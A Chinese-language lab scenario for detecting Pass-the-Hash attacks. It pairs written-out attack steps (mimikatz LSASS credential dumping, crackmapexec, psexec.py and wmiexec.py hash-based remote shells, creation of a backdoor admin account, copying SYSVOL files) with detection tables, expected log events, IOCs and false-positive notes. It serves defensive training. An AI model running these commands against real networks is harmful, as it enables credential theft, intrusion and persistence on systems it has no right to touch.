# 场景2：Pass-the-Hash (PtH)

## ATT&CK 映射

| 字段 | 值 |
|------|-----|
| 战术 | Lateral Movement (横向移动) / Credential Access (凭证获取) |
| 技术 | T1550.002 - Pass the Hash (哈希传递) |
| 相关技术 | T1003.001 (LSASS Memory), T1059.001 (PowerShell) |

## 场景描述

攻击者在 WIN10-01 上以普通用户 jdoe 登录后，使用 mimikatz 从 LSASS 内存中提取本地管理员的 NTLM 哈希。由于域内存在密码复用（本地管理员密码相同），攻击者使用提取到的哈希通过 Pass-the-Hash 技术访问 WIN10-02 和域控 DC01。

## 攻击拓扑

```
WIN10-01 (192.168.56.30)          WIN10-02 (192.168.56.31)
    │                                    ▲
    │ 1. mimikatz 提取本地管理员Hash     │
    │ 2. psexec.py PtH 横向移动          │ 3. 使用Hash访问
    └────────────────────────────────────┘
                    │
                    ▼
            DC01 (192.168.56.20)
            4. 使用Hash访问域控（如果密码复用）
```

## 检测要点

| 数据源 | Event ID | 检测逻辑 |
|--------|----------|----------|
| Sysmon | 1 | mimikatz.exe / procdump.exe 进程创建，命令行含 sekurlsa/logonpasswords |
| Sysmon | 8 | CreateRemoteThread 注入到 lsass.exe |
| Sysmon | 7 | 可疑 DLL 加载到 lsass.exe |
| Windows 安全日志 | 4624 | 登录类型 3 (Network)，NTLM 认证，无对应 4625 前置失败 |
| Windows 安全日志 | 4672 | 管理员登录后立即使用特权 |
| Sysmon | 3 | 来自 WIN10-01 的 445 端口连接到多台主机 |
| Sysmon | 1 | psexec.exe / paexec.exe 进程创建，或 services.exe 派生 cmd.exe |

## 操作步骤

### 步骤1：在 WIN10-01 上获取本地管理员权限

由于 jdoe 已被加入本地管理员组（模拟配置错误），直接以管理员身份打开 PowerShell：

```powershell
# 确认当前权限
whoami /groups | findstr "S-1-5-32-544"

# 下载 mimikatz（实验室环境）
# 方法1：从 Kali 下载
# 方法2：使用已编译的 mimikatz.exe
```

### 步骤2：使用 mimikatz 提取凭证

```powershell
# 以管理员身份运行 mimikatz
.\mimikatz.exe

# 提升权限
mimikatz # privilege::debug

# 从 LSASS 提取明文密码和哈希
mimikatz # sekurlsa::logonpasswords

# 预期输出包含：
#   Username : Administrator
#   Domain   : WIN10-01
#   NTLM     : <32位哈希>
#   SHA1     : <40位哈希>
```

### 步骤3：使用 CrackMapExec 验证哈希

在 Kali 上执行：

```bash
# 保存提取到的哈希（示例，实际使用提取到的值）
ADMIN_HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

# 使用 PtH 访问 WIN10-02
crackmapexec smb 192.168.56.31 -u Administrator -H $ADMIN_HASH

# 使用 PtH 访问 DC01
crackmapexec smb 192.168.56.20 -u Administrator -H $ADMIN_HASH
```

### 步骤4：使用 psexec.py 获得交互式 Shell

```bash
# PtH 横向移动到 WIN10-02
psexec.py -hashes $ADMIN_HASH ./Administrator@192.168.56.31

# 在 WIN10-02 上执行命令
C:\Windows\system32> whoami
C:\Windows\system32> hostname
C:\Windows\system32> ipconfig
```

### 步骤5：使用 wmiexec.py（更隐蔽）

```bash
# WMI 执行（不创建服务，更难检测）
wmiexec.py -hashes $ADMIN_HASH ./Administrator@192.168.56.31 "whoami"

# 执行命令并获取输出
wmiexec.py -hashes $ADMIN_HASH ./Administrator@192.168.56.31 "net user /domain"
```

### 步骤6：在目标主机上留下痕迹（模拟后续操作）

在 WIN10-02 的 psexec shell 中执行：

```cmd
:: 创建后门用户
net user backdoor P@ssw0rd! /add
net localgroup Administrators backdoor /add

:: 查看域信息
net user /domain
net group "Domain Admins" /domain

:: 复制敏感文件
copy \\DC01\SYSVOL\corp.local\scripts\* C:\temp\
```

## 预期日志与告警

### Windows 安全日志（WIN10-01）

| Event ID | 说明 |
|----------|------|
| 4688 | mimikatz.exe 进程创建，命令行含 `sekurlsa::logonpasswords` |
| 4672 | mimikatz 以管理员权限运行 |

### Windows 安全日志（WIN10-02）

| Event ID | 说明 |
|----------|------|
| 4624 | 登录类型 3，NTLM 认证，来源 WIN10-01，用户 Administrator |
| 4672 | 管理员特权登录 |
| 4697 | 服务创建（PSEXESVC） |
| 4688 | PSEXESVC.exe 派生 cmd.exe |

### Sysmon 日志

| Event ID | 主机 | 说明 |
|----------|------|------|
| 1 | WIN10-01 | mimikatz.exe 进程创建 |
| 8 | WIN10-01 | CreateRemoteThread 到 lsass.exe |
| 3 | WIN10-01 | 到 WIN10-02:445 的网络连接 |
| 1 | WIN10-02 | PSEXESVC.exe 进程创建 |
| 11 | WIN10-02 | PSEXESVC.exe 文件写入到 C:\Windows\ |
| 13 | WIN10-02 | 服务注册表项创建 |

## IOC（失陷指标）

| 类型 | 值 |
|------|-----|
| 进程名 | mimikatz.exe, PSEXESVC.exe, psexec.exe |
| 命令行 | `sekurlsa::logonpasswords`, `privilege::debug` |
| 服务名 | PSEXESVC |
| 文件路径 | C:\Windows\PSEXESVC.exe |
| 源 IP | 192.168.56.30 (WIN10-01) |
| 目标端口 | 445 (SMB) |
| 认证方式 | NTLM (无 Kerberos) |
| 登录类型 | 3 (Network) |

## 误报分析

- 管理员使用 psexec 进行合法运维：通常有变更记录，目标主机有限，时间在工作时段
- 备份软件访问 admin$ 共享：使用特定服务账号，有固定时间表
- 监控代理远程执行：使用已知进程名，非交互式
